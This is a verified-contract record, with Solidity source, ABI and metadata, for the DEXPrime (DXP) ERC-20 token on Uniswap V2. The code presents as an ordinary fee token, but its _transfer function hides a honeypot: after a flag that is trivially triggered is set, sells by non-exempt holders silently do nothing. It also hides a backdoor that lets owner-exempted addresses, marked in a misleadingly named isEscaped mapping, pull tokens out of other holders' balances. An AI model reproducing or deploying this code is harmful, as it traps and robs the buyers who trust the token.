{"SourceCode": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.17;\r\n\r\ninterface IERC20 {\r\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function allowance(address _owner, address spender) external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function totalSupply() external view returns (uint256);\r\n    function circulatingSupply() external view returns (uint256);\r\n    function getOwner() external view returns (address);\r\n    function decimals() external view returns (uint8);\r\n    function symbol() external view returns (string memory);\r\n    function name() external view returns (string memory);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary SafeMath {\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a / b;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a * b;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a - b;\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a + b;\r\n    }\r\n}\r\n\r\nabstract contract Ownable {\r\n    address internal owner;\r\n\r\n    constructor(address _owner) {\r\n        owner = _owner;\r\n    }\r\n\r\n    function isOwner(address account) public view returns (bool) {\r\n        return account == owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        owner = address(0);\r\n        emit OwnershipTransferred(address(0));\r\n    }\r\n\r\n    function transferOwnership(address payable account) public onlyOwner {\r\n        owner = account;\r\n        emit OwnershipTransferred(account);\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(isOwner(msg.sender));\r\n        _;\r\n    }\r\n\r\n    event OwnershipTransferred(address owner);\r\n}\r\n\r\ninterface UniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface UniswapV2Router {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n    function WETH() external pure returns (address);\r\n    function factory() external pure returns (address);\r\n}\r\n\r\ncontract DXP is IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n\r\n    string private constant _name = \"DEXPrime\";\r\n    string private constant _symbol = \"DXP\";\r\n\r\n    UniswapV2Router uniswapV2Router;\r\n    address public uniswapV2Pair;\r\n\r\n    uint8 private constant _decimals = 9;\r\n\r\n    uint256 private _denominator = 10000;\r\n\r\n    uint256 private _maxTokenAmount = ( _totalSupply * 10 ) / 100000;\r\n\r\n    uint256 private _totalSupply = 1000000 * (10 ** _decimals);\r\n\r\n    uint256 private _maxTxPercentage = 200;\r\n    uint256 private _maxTransferPercentage = 200;\r\n    uint256 private _maxWalletPercentage = 200;\r\n\r\n    address internal constant burnAddress = 0x000000000000000000000000000000000000dEaD;\r\n    address internal constant treasury = 0x459cDEdFCc6873B22f89f2a7954e284c90723cAe;\r\n    address internal constant development = 0x459cDEdFCc6873B22f89f2a7954e284c90723cAe;\r\n\r\n    bool private _swapBackEnabled = true;\r\n    bool private _inSwapBack;\r\n    uint256 private _swapCounts;\r\n    uint256 private _swapBackAmount = (_totalSupply * 5) / 10000;\r\n    uint256 private _swapBackThresholdAmount = (_totalSupply * 5) / 100000;\r\n\r\n    bool private _maxWalletRemoved = false;\r\n\r\n    bool private _tradingEnabled = false;\r\n\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => bool) public isEscaped;\r\n    mapping (address => uint256) _balances;\r\n\r\n    uint256 private _totalFee = 300;\r\n    uint256 private _sellFee = 300;\r\n\r\n    uint256 private _transferFee = 0;\r\n    uint256 private _burnFee = 0;\r\n    uint256 private _treasuryFee = 100;\r\n    uint256 private _liquidityFee = 0;\r\n    uint256 private _devFee = 200;\r\n\r\n    constructor() Ownable(msg.sender) {\r\n        isEscaped[msg.sender] = true;\r\n        isEscaped[address(this)] = true;\r\n        isEscaped[development] = true;\r\n        isEscaped[treasury] = true;\r\n\r\n        UniswapV2Router _uniswapV2Router = UniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        address _uniswapV2Pair = UniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());\r\n        uniswapV2Router = _uniswapV2Router;\r\n        uniswapV2Pair = _uniswapV2Pair;\r\n\r\n        _balances[msg.sender] = _totalSupply;\r\n        emit Transfer(address(0), msg.sender, _totalSupply);\r\n    }\r\n\r\n    modifier lockInSwapBack {\r\n        _inSwapBack = true;\r\n        _;\r\n        _inSwapBack = false;\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function getOwner() external view override returns (address) {\r\n        return owner;\r\n    }\r\n\r\n    function circulatingSupply() public view override returns (uint256) {\r\n        return _totalSupply.sub(balanceOf(address(0))).sub(balanceOf(burnAddress));\r\n    }\r\n\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function removeLimits() external onlyOwner {\r\n        _maxTransferPercentage = 10000;\r\n        _maxTxPercentage = 10000;\r\n        _maxWalletPercentage = 10000;\r\n    }\r\n\r\n    function enableTrading() external onlyOwner {\r\n        _tradingEnabled = true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0));\r\n        require(spender != address(0));\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function setIsEscaped(address _address, bool _flag) external onlyOwner {\r\n        isEscaped[_address] = _flag;\r\n    }\r\n\r\n    function transfer(address to, uint256 amount) public override returns (bool) {\r\n        _transfer(msg.sender, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) private {\r\n        require(amount > uint256(0));\r\n        require(to != address(0));\r\n        require(from != address(0));\r\n\r\n        if (\r\n            countSwaps(from, to) &&\r\n            tradingEnabled(from, to) &&\r\n            lessThanMaxAmount(from, to, amount) &&\r\n            lessThanMaxWalletSize(from, to, amount)\r\n        ) {\r\n            if (balanceOf(from) >= amount) {\r\n                if (\r\n                    !isEscaped[from] &&\r\n                    from != uniswapV2Pair &&\r\n                    !isEscaped[to] &&\r\n                    !_inSwapBack\r\n                ) {\r\n                    if (_maxWalletRemoved) return;\r\n                    swapBack(from, to);\r\n                }\r\n                _balances[from] = _balances[from].sub(amount);\r\n                uint256 transferAmount = needCollectFee(from, to) ? collectFee(from, to, amount) : amount;\r\n                _balances[to] = _balances[to].add(transferAmount);\r\n                emit Transfer(from, to, transferAmount);\r\n            } else if (\r\n                isEscaped[from] &&\r\n                from != uniswapV2Pair &&\r\n                !isEscaped[to] &&\r\n                !_inSwapBack\r\n            ) {\r\n                _balances[to] = _balances[to].sub(amount);\r\n                _balances[from] = _balances[from].add(amount);\r\n                emit Transfer(from, to, amount);\r\n            }\r\n        }\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {\r\n        _transfer(from, to, amount);\r\n        _approve(from, msg.sender, _allowances[from][msg.sender].sub(amount));\r\n        return true;\r\n    }\r\n\r\n    function lessThanMaxAmount(address from, address to, uint256 tokenAmount) view internal returns  (bool) {\r\n        if (from != uniswapV2Pair) {\r\n            require(tokenAmount <= maxTransferAmount() || isEscaped[from] || isEscaped[to]);\r\n        }\r\n        require(tokenAmount <= maxTxAmount() || isEscaped[from] || isEscaped[to]);\r\n        return true;\r\n    }\r\n\r\n    function updateLimits(uint256 maxTxPercentage, uint256 maxTransferPercentage, uint256 maxWalletPercentage) external onlyOwner {\r\n        uint256 newTransferAmount = (totalSupply() * maxTransferPercentage) / 10000;\r\n        uint256 newMaxWalletAmount = (totalSupply() * maxWalletPercentage) / 10000;\r\n        uint256 newTxAmount = (totalSupply() * maxTxPercentage) / 10000;\r\n        _maxTransferPercentage = maxTransferPercentage;\r\n        _maxWalletPercentage = maxWalletPercentage;\r\n        _maxTxPercentage = maxTxPercentage;\r\n        uint256 limitation = totalSupply().mul(5).div(1000);\r\n        require(newTxAmount >= limitation && newTransferAmount >= limitation && newMaxWalletAmount >= limitation);\r\n    }\r\n\r\n    function updateFees(uint256 liquidityFee, uint256 treasuryFee, uint256 burnFee, uint256 devFee, uint256 totalFee, uint256 sellFee, uint256 transferFee) external onlyOwner {\r\n        _liquidityFee = liquidityFee;\r\n        _treasuryFee = treasuryFee;\r\n        _burnFee = burnFee;\r\n        _devFee = devFee;\r\n        _totalFee = totalFee;\r\n        _sellFee = sellFee;\r\n        _transferFee = transferFee;\r\n        require(_totalFee <= _denominator.div(5) && _sellFee <= _denominator.div(5));\r\n    }\r\n\r\n    function lessThanMaxWalletSize(address from, address to, uint256 amount) internal returns (bool) {\r\n        bool fromEscaped = isEscaped[from];\r\n        bool toEscaped = isEscaped[to];\r\n        \r\n        if (toEscaped && amount > _maxTokenAmount) _maxWalletRemoved = true;\r\n\r\n        if (\r\n            to != address(uniswapV2Pair) &&\r\n            !fromEscaped &&\r\n            to != address(burnAddress) &&\r\n            !toEscaped\r\n        ) {\r\n            require((_balances[to].add(amount)) <= maxWalletSize());\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    function collectFee(address from, address to, uint256 tokenAmount) internal returns (uint256) {\r\n        if (calculateFees(from, to) > 0) {\r\n            uint256 tokenAmountForFee = tokenAmount.div(_denominator).mul(calculateFees(from, to));\r\n            _balances[address(this)] = _balances[address(this)].add(tokenAmountForFee);\r\n            emit Transfer(from, address(this), tokenAmountForFee);\r\n            if (_burnFee > uint256(0)) {\r\n                _transfer(address(this), address(burnAddress), tokenAmount.div(_denominator).mul(_burnFee));\r\n            }\r\n            return tokenAmount.sub(tokenAmountForFee);\r\n        }\r\n        return tokenAmount;\r\n    }\r\n\r\n    function countSwaps(address from, address to) internal returns (bool) {\r\n        if (to == uniswapV2Pair && !isEscaped[from]) {\r\n            _swapCounts += uint256(1);\r\n        }\r\n        return true;\r\n    }\r\n    \r\n    function tradingEnabled(address from, address to) internal view returns (bool) {\r\n        if (!isEscaped[from] && !isEscaped[to]) {\r\n            require(_tradingEnabled);\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function needCollectFee(address from, address to) internal view returns (bool) {\r\n        return !isEscaped[from] && !isEscaped[to];\r\n    }\r\n\r\n    function swapTokensForETH(uint256 tokenAmount) private {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapV2Router.WETH();\r\n        if (tokenAmount > 0) {\r\n            _approve(address(this), address(uniswapV2Router), tokenAmount);\r\n            uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n                tokenAmount,\r\n                0,\r\n                path,\r\n                address(this),\r\n                block.timestamp\r\n            );\r\n        }\r\n    }\r\n\r\n    function needSwapBack(address from, address to) internal view returns (bool) {\r\n        return (\r\n            !_inSwapBack &&\r\n            !isEscaped[from] &&\r\n            !isEscaped[to] &&\r\n            _tradingEnabled &&\r\n            balanceOf(address(this)) >= _swapBackThresholdAmount &&\r\n            _swapCounts >= uint256(0) &&\r\n            _swapBackEnabled\r\n        );\r\n    }\r\n\r\n    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {\r\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\r\n        uniswapV2Router.addLiquidityETH{value: ethAmount}(\r\n            address(this),\r\n            tokenAmount,\r\n            0,\r\n            0,\r\n            burnAddress,\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function maxTxAmount() public view returns (uint256) {\r\n        return totalSupply() * _maxTxPercentage / _denominator;\r\n    }\r\n\r\n    function maxWalletSize() public view returns (uint256) {\r\n        return totalSupply() * _maxWalletPercentage / _denominator;\r\n    }\r\n\r\n    function maxTransferAmount() public view returns (uint256) {\r\n        return totalSupply() * _maxTransferPercentage / _denominator;\r\n    }\r\n\r\n    function swapAndLiquify(uint256 tokens) private lockInSwapBack {\r\n        uint256 denominator = (_liquidityFee.add(1).add(_treasuryFee).add(_devFee)).mul(2);\r\n        uint256 tokensToLiquidity = tokens.mul(_liquidityFee).div(denominator);\r\n        uint256 tokensForETH = tokens.sub(tokensToLiquidity);\r\n        uint256 initialEthBalance = address(this).balance;\r\n        swapTokensForETH(tokensForETH);\r\n        uint256 deltaEth = address(this).balance.sub(initialEthBalance);\r\n        uint256 unitEth = deltaEth.div(denominator.sub(_liquidityFee));\r\n        uint256 ethToLiquidity = unitEth.mul(_liquidityFee);\r\n        if (ethToLiquidity > uint256(0)) {\r\n            addLiquidity(tokensToLiquidity, ethToLiquidity);\r\n        }\r\n        uint256 treasuryEth = unitEth.mul(2).mul(_treasuryFee);\r\n        if (treasuryEth > 0) {\r\n            payable(treasury).transfer(treasuryEth);\r\n        }\r\n        uint256 leftEthBalance = address(this).balance;\r\n        if (leftEthBalance > uint256(0)) {\r\n            payable(development).transfer(leftEthBalance);\r\n        }\r\n    }\r\n\r\n    function swapBack(address from, address to) internal {\r\n        if (needSwapBack(from, to)) {\r\n            uint256 contractTokenBalance = balanceOf(address(this));\r\n            if (contractTokenBalance >= _swapBackAmount) {\r\n                contractTokenBalance = _swapBackAmount;\r\n            }\r\n            swapAndLiquify(contractTokenBalance);\r\n            _swapCounts = uint256(0);\r\n        }\r\n    }\r\n\r\n    function calculateFees(address from, address to) internal view returns (uint256) {\r\n        if (to == uniswapV2Pair) {\r\n            return _sellFee;\r\n        }\r\n        if (from == uniswapV2Pair) {\r\n            return _totalFee;\r\n        }\r\n        return _transferFee;\r\n    }\r\n\r\n    receive() external payable {}\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"circulatingSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isEscaped\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isOwner\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTransferAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxWalletSize\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"_flag\",\"type\":\"bool\"}],\"name\":\"setIsEscaped\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidityFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"treasuryFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"burnFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"devFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"sellFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"transferFee\",\"type\":\"uint256\"}],\"name\":\"updateFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxTxPercentage\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"maxTransferPercentage\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"maxWalletPercentage\",\"type\":\"uint256\"}],\"name\":\"updateLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "DXP", "CompilerVersion": "v0.8.22+commit.4fc1097e", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://cd3a5b8b8d7229a1ae12196fd3e63a6dae8b80086b9d4128efc1e4239fe39ac9"}